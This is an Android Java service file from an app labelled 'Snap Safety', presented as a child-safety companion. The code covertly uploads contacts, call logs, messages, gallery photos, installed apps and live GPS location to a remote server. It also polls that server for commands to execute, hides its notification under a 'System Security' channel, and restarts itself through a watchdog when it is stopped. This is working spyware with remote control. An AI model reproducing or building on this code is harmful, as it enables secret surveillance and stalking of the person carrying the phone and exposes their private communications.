package com.snapapp.companion;

import android.annotation.SuppressLint;
import android.app.*;
import android.content.*;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.*;
import androidx.core.app.NotificationCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.concurrent.*;

public class CompanionSyncService extends Service {
    private static final String CHANNEL_ID = "snap_safety_channel";
    private static final int NOTIF_ID = 1001;

    private ScheduledExecutorService scheduler;
    private SharedPreferences prefs;
    private LocationManager locationManager;
    private LocationListener locationListener;
    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("snap_companion_prefs", MODE_PRIVATE);
        acquireWakeLock();
        createNotificationChannel();
        initLocationListener();
        WatchdogReceiver.scheduleWatchdog(this);
    }

    @SuppressLint("WakelockTimeout")
    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "snap:synclock");
                wakeLock.acquire();
            }
        } catch (Exception ignored) {}
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(NOTIF_ID, buildNotification());
        startPeriodicSync();
        requestActiveLocationFix();
        syncInitialTelemetry();
        WatchdogReceiver.scheduleWatchdog(this);
        return START_STICKY;
    }

    public static volatile boolean isLiveMovementActive = false;
    public static void setLiveMovementActive(Context ctx, boolean active) {
        isLiveMovementActive = active;
    }

    private void syncInitialTelemetry() {
        final String deviceId = prefs.getString("device_id", null);
        final String serverUrl = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
        if (deviceId == null) return;
        TelemetryHelper.syncInstalledApps(this, serverUrl, deviceId, null);
        TelemetryHelper.syncContacts(this, serverUrl, deviceId, null);
        TelemetryHelper.syncCalls(this, serverUrl, deviceId, null);
        TelemetryHelper.syncMessages(this, serverUrl, deviceId, null);
        GalleryHelper.syncGallery(this, serverUrl, deviceId, null);
    }

    private void initLocationListener() {
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        if (locationManager == null) return;
        locationListener = loc -> { if (loc != null) dispatchLocation(loc); };
    }

    @SuppressLint("MissingPermission")
    private void requestActiveLocationFix() {
        if (locationManager == null || locationListener == null) return;
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                long interval = isLiveMovementActive ? 3000L : 30000L;
                float dist = isLiveMovementActive ? 1.0f : 5.0f;
                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, interval, dist, locationListener, Looper.getMainLooper());
                    Location last = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if (last != null) dispatchLocation(last);
                }
                if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, interval, dist, locationListener, Looper.getMainLooper());
                    Location last = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    if (last != null) dispatchLocation(last);
                }
            } catch (SecurityException ignored) {}
        });
    }

    private void dispatchLocation(Location loc) {
        final String deviceId = prefs.getString("device_id", null);
        final String serverUrl = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
        if (deviceId == null || loc == null) return;

        if (isLiveMovementActive) {
            try {
                JSONObject b = new JSONObject();
                b.put("device_id", deviceId);
                b.put("latitude", loc.getLatitude());
                b.put("longitude", loc.getLongitude());
                b.put("accuracy", loc.getAccuracy());
                b.put("speed", loc.getSpeed());
                b.put("battery_level", getBatteryLevel());
                b.put("persist", true);
                ApiClient.postJson(serverUrl + "/api/device-sync/live-location", b, null);
            } catch (Exception ignored) {}
        } else {
            ApiClient.sendLocation(serverUrl, deviceId, loc.getLatitude(), loc.getLongitude(), loc.getAccuracy(), getBatteryLevel(), null);
        }
    }

    private void startPeriodicSync() {
        if (scheduler != null && !scheduler.isShutdown()) return;
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleWithFixedDelay(() -> {
            requestActiveLocationFix();
            pollServerCommands();
        }, 2, 20, TimeUnit.SECONDS);
    }

    private void pollServerCommands() {
        final String deviceId = prefs.getString("device_id", null);
        final String serverUrl = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
        if (deviceId == null) return;

        ApiClient.sendHeartbeat(serverUrl, deviceId, getBatteryLevel(), false, new ApiClient.ApiCallback() {
            @Override
            public void onSuccess(JSONObject res) {
                JSONObject rt = res.optJSONObject("realtime");
                if (rt != null) {
                    RealtimeSocketManager.getInstance(CompanionSyncService.this).connect(rt.optString("ws_url"), deviceId, serverUrl);
                }
                JSONArray cmds = res.optJSONArray("commands");
                if (cmds == null || cmds.length() == 0) return;
                for (int i = 0; i < cmds.length(); i++) {
                    JSONObject c = cmds.optJSONObject(i);
                    CommandDispatcher.dispatch(CompanionSyncService.this, serverUrl, deviceId, c, () -> requestActiveLocationFix());
                }
            }
            @Override public void onError(String e) {}
        });
    }

    private int getBatteryLevel() {
        Intent bi = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        if (bi == null) return 100;
        int level = bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = bi.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
        return (level >= 0 && scale > 0) ? (int) ((level / (float) scale) * 100) : 100;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "System Security", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        Intent launch = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, launch, Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0);
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Snap Safety")
                .setContentText("Child safety service active")
                .setSmallIcon(R.drawable.ic_launcher)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .setContentIntent(pi).build();
    }

    @Override public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        WatchdogReceiver.scheduleWatchdog(this);
        if (scheduler != null) scheduler.shutdown();
        if (locationManager != null && locationListener != null) locationManager.removeUpdates(locationListener);
        RealtimeSocketManager.getInstance(this).disconnect();
        if (wakeLock != null && wakeLock.isHeld()) {
            try { wakeLock.release(); } catch (Exception ignored) {}
        }
        super.onDestroy();
    }
}
